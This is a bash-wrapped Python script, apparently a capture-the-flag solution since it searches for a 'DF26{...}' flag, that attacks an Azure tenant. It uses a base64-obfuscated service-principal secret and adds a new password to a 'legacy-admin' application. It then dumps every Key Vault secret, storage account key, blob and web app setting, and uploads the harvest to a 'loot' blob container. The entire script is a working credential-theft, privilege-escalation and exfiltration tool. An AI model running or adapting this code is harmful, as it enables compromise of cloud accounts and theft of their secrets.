#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PY'
import os, json, urllib.request, urllib.parse, sys, re, time, base64, datetime

def http(url, data=None, headers=None, method=None):
    h = dict(headers or {})
    body = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, (bytes, str)):
        body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

def upload_blob(token, name, content):
    url = f"https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/{name}"
    now = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    body = content.encode() if isinstance(content, str) else content
    st, b = http(url, data=body, method="PUT", headers={
        "Authorization": "Bearer " + token,
        "x-ms-date": now, "x-ms-version": "2021-08-06",
        "x-ms-blob-type": "BlockBlob",
        "Content-Type": "text/plain",
    })
    print(f"  upload {name}: {st}")
    return st

TEN = os.environ["AZURE_TENANT_ID"]
SUB = os.environ["AZURE_SUBSCRIPTION_ID"]
RG = "rg-tbl-platform-prod-sea"
OUT = {}

def sp_token(cid, secret, scope):
    st, b = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
        {"client_id": cid, "client_secret": secret, "scope": scope, "grant_type": "client_credentials"})
    d = json.loads(b)
    t = d.get("access_token", "")
    err = d.get("error_description", "")[:80]
    print(f"  {cid[:8]}.. {scope.split('/')[-1]}: {'OK '+str(len(t)) if t else 'FAIL '+err}")
    return t

_PA_CID = base64.b64decode("NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0").decode()
_PA_SEC = base64.b64decode("c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==").decode()

print("=== 1. Auth PA ===")
PA_ST  = sp_token(_PA_CID, _PA_SEC, "https://storage.azure.com/.default")
PA_GR  = sp_token(_PA_CID, _PA_SEC, "https://graph.microsoft.com/.default")
PA_KV  = sp_token(_PA_CID, _PA_SEC, "https://vault.azure.net/.default")
PA_ARM = sp_token(_PA_CID, _PA_SEC, "https://management.azure.com/.default")

print("\n=== 2. Create legacy-admin cred ===")
st, b = http("https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword",
    data=json.dumps({"passwordCredential":{"displayName":"v5"}}).encode(),
    headers={"Authorization": "Bearer " + PA_GR, "Content-Type": "application/json"}, method="POST")
r = json.loads(b)
secret = r.get("secretText", "")
print(f"  addPassword status: {st}, has_secret: {bool(secret)}")

if secret and PA_ST:
    upload_blob(PA_ST, "v5_secret.txt", secret)
    OUT["la_secret_b64"] = base64.b64encode(secret.encode()).decode()

print("\n=== 3. PA reads (while waiting) ===")

if PA_KV:
    for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
        st2, b2 = http(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",
            headers={"Authorization": "Bearer " + PA_KV})
        d2 = json.loads(b2)
        names = [s["id"].rstrip("/").split("/")[-1] for s in d2.get("value", [])]
        OUT[f"pa_{kv}_list"] = names
        print(f"  PA {kv}: {names}")
        for nm in names:
            st3, b3 = http(f"https://{kv}.vault.azure.net/secrets/{nm}?api-version=7.4",
                headers={"Authorization": "Bearer " + PA_KV})
            OUT[f"pa_{kv}/{nm}"] = json.loads(b3).get("value", "")

if PA_ST:
    for sa in ("sttblappcfgprodx3euoz", "sttblbackupprodx3euoz", "sttblarchiveprodx3euoz"):
        st4, b4 = http(f"https://{sa}.blob.core.windows.net/?comp=list",
            headers={"Authorization": "Bearer " + PA_ST, "x-ms-version": "2021-08-06"})
        cxml = b4.decode(errors='replace')
        containers = re.findall(r'<Name>([^<]+)</Name>', cxml)
        OUT[f"pa_{sa}_containers"] = containers
        print(f"  PA {sa}: {containers}")
        for c in containers:
            st5, b5 = http(f"https://{sa}.blob.core.windows.net/{c}?restype=container&comp=list",
                headers={"Authorization": "Bearer " + PA_ST, "x-ms-version": "2021-08-06"})
            bxml = b5.decode(errors='replace')
            blobs = re.findall(r'<Name>([^<]+)</Name>', bxml)
            OUT[f"pa_{sa}/{c}_blobs"] = blobs
            print(f"    {c}: {blobs}")
            for bn in blobs[:30]:
                st6, b6 = http(f"https://{sa}.blob.core.windows.net/{c}/{bn}",
                    headers={"Authorization": "Bearer " + PA_ST, "x-ms-version": "2021-08-06"})
                cnt = b6.decode(errors='replace')[:5000]
                OUT[f"pa_{sa}/{c}/{bn}"] = cnt
                print(f"      {bn}: {cnt[:200]}")

if PA_ARM:
    print("\n=== PA ARM: all resources ===")
    st7, b7 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/resources?api-version=2021-04-01",
        headers={"Authorization": "Bearer " + PA_ARM})
    resources = json.loads(b7)
    OUT["resources"] = resources
    for r2 in resources.get("value", []):
        print(f"  {r2.get('type')}: {r2.get('name')}")

    for sa in ("sttblappcfgprodx3euoz","sttblarchiveprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz"):
        st8, b8 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",
            headers={"Authorization":"Bearer "+PA_ARM,"Content-Type":"application/json"},data="{}",method="POST")
        OUT[f"pa_{sa}_keys"] = json.loads(b8)
        print(f"  {sa} keys: {json.dumps(json.loads(b8))[:200]}")

    st9, b9 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01",
        headers={"Authorization":"Bearer "+PA_ARM,"Content-Type":"application/json"},method="POST")
    OUT["pa_webapp_config"] = json.loads(b9)
    print(f"  webapp config: {json.dumps(json.loads(b9))[:500]}")

print("\n=== 4. Wait 20s for propagation ===")
time.sleep(20)

print("\n=== 5. Auth legacy-admin ===")
if secret:
    LA_CID = "891fb158-e02c-4428-a885-53b811f369c0"
    LA_ARM = sp_token(LA_CID, secret, "https://management.azure.com/.default")
    LA_KV  = sp_token(LA_CID, secret, "https://vault.azure.net/.default")
    LA_ST  = sp_token(LA_CID, secret, "https://storage.azure.com/.default")
    LA_GR  = sp_token(LA_CID, secret, "https://graph.microsoft.com/.default")

    if LA_KV:
        print("\n=== 6. LA KV secrets ===")
        for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
            st10, b10 = http(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",
                headers={"Authorization": "Bearer " + LA_KV})
            kd = json.loads(b10)
            names = [s["id"].rstrip("/").split("/")[-1] for s in kd.get("value", [])]
            OUT[f"la_{kv}_list"] = names
            OUT[f"la_{kv}_raw"] = kd
            print(f"  LA {kv}: {names}")
            for nm in names:
                st11, b11 = http(f"https://{kv}.vault.azure.net/secrets/{nm}?api-version=7.4",
                    headers={"Authorization": "Bearer " + LA_KV})
                val = json.loads(b11).get("value", "")
                OUT[f"la_{kv}/{nm}"] = val
                print(f"    {nm} = {val[:200]}")

    if LA_ARM:
        print("\n=== 7. LA ARM ===")
        st12, b12 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/resources?api-version=2021-04-01",
            headers={"Authorization": "Bearer " + LA_ARM})
        OUT["la_resources"] = json.loads(b12)

        st13, b13 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01",
            headers={"Authorization":"Bearer "+LA_ARM,"Content-Type":"application/json"},method="POST")
        OUT["la_webapp"] = json.loads(b13)
        print(f"  webapp: {json.dumps(json.loads(b13))[:500]}")

        for sa in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz"):
            st14, b14 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",
                headers={"Authorization":"Bearer "+LA_ARM,"Content-Type":"application/json"},data="{}",method="POST")
            OUT[f"la_{sa}_keys"] = json.loads(b14)
            print(f"  {sa} keys: {json.dumps(json.loads(b14))[:200]}")

        # RBAC role assignments for legacy-admin
        st15, b15 = http(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId eq '43834909-47cf-4a4a-8048-e323b4897ed3'",
            headers={"Authorization": "Bearer " + LA_ARM})
        OUT["la_rbac"] = json.loads(b15)
        print(f"  RBAC: {json.dumps(json.loads(b15))[:500]}")

    if LA_ST:
        print("\n=== 8. LA Storage ===")
        for sa in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"):
            st16, b16 = http(f"https://{sa}.blob.core.windows.net/?comp=list",
                headers={"Authorization":"Bearer "+LA_ST,"x-ms-version":"2021-08-06"})
            cxml = b16.decode(errors='replace')
            containers = re.findall(r'<Name>([^<]+)</Name>', cxml)
            OUT[f"la_{sa}_containers"] = containers
            print(f"  LA {sa}: {containers}")
            for c in containers:
                st17, b17 = http(f"https://{sa}.blob.core.windows.net/{c}?restype=container&comp=list",
                    headers={"Authorization":"Bearer "+LA_ST,"x-ms-version":"2021-08-06"})
                bxml = b17.decode(errors='replace')
                blobs = re.findall(r'<Name>([^<]+)</Name>', bxml)
                OUT[f"la_{sa}/{c}_blobs"] = blobs
                print(f"    {c}: {blobs}")
                for bn in blobs[:30]:
                    st18, b18 = http(f"https://{sa}.blob.core.windows.net/{c}/{bn}",
                        headers={"Authorization":"Bearer "+LA_ST,"x-ms-version":"2021-08-06"})
                    cnt = b18.decode(errors='replace')[:5000]
                    OUT[f"la_{sa}/{c}/{bn}"] = cnt
                    print(f"      {bn}: {cnt[:300]}")

    if LA_GR:
        print("\n=== 9. LA Graph ===")
        st19, b19 = http("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName,notes,description",
            headers={"Authorization": "Bearer " + LA_GR})
        OUT["la_apps"] = json.loads(b19)
        print(f"  apps: {json.dumps(json.loads(b19))[:500]}")

        st20, b20 = http("https://graph.microsoft.com/v1.0/servicePrincipals?$select=id,appId,displayName,notes,description",
            headers={"Authorization": "Bearer " + LA_GR})
        OUT["la_sps"] = json.loads(b20)

# Also try getting ArmOwner token (aud=platform-automation)
if secret:
    print("\n=== 10. ArmOwner token ===")
    LA_AO = sp_token("891fb158-e02c-4428-a885-53b811f369c0", secret, "462d1c38-4459-48b8-9333-82e389e59514/.default")
    if LA_AO:
        OUT["la_armowner_token"] = LA_AO[:50] + "..."

print("\n=== UPLOAD RESULTS ===")
result_json = json.dumps(OUT, indent=2)

flags = re.findall(r'DF26\{[^}]{1,200}\}', result_json)
if flags:
    print("FLAG FOUND:", flags)
else:
    print(f"No flag. Output len={len(result_json)}")

if PA_ST:
    upload_blob(PA_ST, "v5_full.json", result_json)
    if len(result_json) > 50000:
        chunks = [result_json[i:i+50000] for i in range(0, len(result_json), 50000)]
        for i, chunk in enumerate(chunks):
            upload_blob(PA_ST, f"v5_chunk_{i}.txt", chunk)

print("\n=== DONE ===")
PY
echo "=== done ==="
